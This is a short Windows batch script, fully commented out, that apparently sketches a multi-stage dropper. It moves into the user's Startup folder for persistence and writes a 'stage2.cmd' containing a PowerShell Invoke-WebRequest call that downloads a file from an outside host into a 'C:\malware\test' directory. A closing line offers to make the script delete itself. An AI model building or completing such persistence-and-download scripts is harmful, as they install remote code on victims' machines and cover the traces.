
@REM @echo off

@REM SET currentDirectory=%cd%
@REM echo Current directory: %currentDirectory%

@REM SET STARTUPPATH="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
@REM cd %STARTUPPATH%

@REM build stage 2
@REM (
@REM     powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/next.config.ts' -OutFile 'C:\malware\test\download.txt'"
@REM ) > stage2.cmd



@REM cd %currentDirectory%

@rem uncomment to make the script delete itself
@rem del initial.bat
